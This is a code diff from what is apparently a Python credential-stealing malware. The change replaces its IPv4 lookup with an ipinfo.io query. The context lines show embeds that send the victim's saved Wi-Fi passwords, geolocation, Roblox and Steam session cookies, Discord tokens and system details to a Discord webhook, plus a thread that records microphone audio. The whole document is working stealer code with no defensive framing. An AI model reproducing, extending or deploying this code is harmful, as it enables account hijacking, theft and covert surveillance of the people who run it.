@@ -68,16 +68,7 @@ def remove_all_zip_files(directory):
                 pass
 
 webhook = DiscordWebhook(url=webhookurl)#Set up webhook
-def ip4():#Get ipv4
-    try:
-     try:
-       ip=requests.get('https://4.ident.me')
-       return ip.text
-     except:
-       ip=requests.get('https://4.tnedi.me')
-       return ip.text
-    except:
-        return []
+
 def ip6():#get ipv6
     try:
      try:
@@ -116,7 +107,8 @@ wifi=wifi.replace(',','\n')
 
 r = requests.get('http://ipinfo.io/json')
 data=r.json()
-
+if 'ip' in data:
+    ip4=data['ip']
 if 'org' in data:
     org = data['org']
 else:
@@ -781,7 +773,7 @@ micthread=threading.Thread(target=record_audio)
 wifiembed=DiscordEmbed(title='Saved Wifi',description=f'```{wifi}```',color='60cc88')
 geolocationembed=DiscordEmbed(title='Geolocation Data',description=f'```Latitude: {lat}```\n```Longitude: {long}```\n```City: {city}```\n```Region: {region}```\n```Country: {country}```\n```Postal Code: {postal}```\n```Timezone: {timezone}```\n```Router Orginisation: {org}```\n```Router Hostname: {hostname}```',color='fcba03')
 robloxembed=DiscordEmbed(title='Roblox Cookies',description=f'Opera:```{robloopera}```\nChrome:```{roblochrome}```\nEdge:```{robloedge}```\nFirefox:```{roblofire}```',color='6f00ff')
-sysembed=DiscordEmbed(title='System Information',description=f'```Hostname: {info["Hostname"]}```\n```IPv4: {ip4()}```\n```IPv6: {ip6()}```\n```Proccessor: {info["Processor"]}```\n```Ram: {info["RAM"]}```\n```Machine: {info["Machine"]}```\n```Architecture: {info["Architecture"]}```\n```OS: {info["OS"]}```\n```OS-Release: {info["OS-release"]}```\n```OS-Version: {info["OS-version"]}```\n```Mac-Address: {info["Mac-Address"]}```',color='ab222b')
+sysembed=DiscordEmbed(title='System Information',description=f'```Hostname: {info["Hostname"]}```\n```IPv4: {ip4}```\n```IPv6: {ip6()}```\n```Proccessor: {info["Processor"]}```\n```Ram: {info["RAM"]}```\n```Machine: {info["Machine"]}```\n```Architecture: {info["Architecture"]}```\n```OS: {info["OS"]}```\n```OS-Release: {info["OS-release"]}```\n```OS-Version: {info["OS-version"]}```\n```Mac-Address: {info["Mac-Address"]}```',color='ab222b')
 steamloginembed = DiscordEmbed(title='steamLoginSecure Cookies',description=f'Opera:```{opera_steam_cookie}```\nChrome:```{chrome_steam_cookie}```\nEdge:```{edge_steam_cookie}```\nFirefox:```{firefox_steam_cookie}```',color='4e6cd9')
 steamsesembed = DiscordEmbed(title='Steam sessionid cookies',description=f'Opera:```{opera_session_cookie}```\nChrome:```{chrome_session_cookie}```\nEdge:```{edge_session_cookie}```\nFirefox:```{firefox_session_cookie}```',color='4e6cd9')
 discordtokenembed= DiscordEmbed(title='Discord Token',description=f'Token:\n```{Discordtokens()}```')
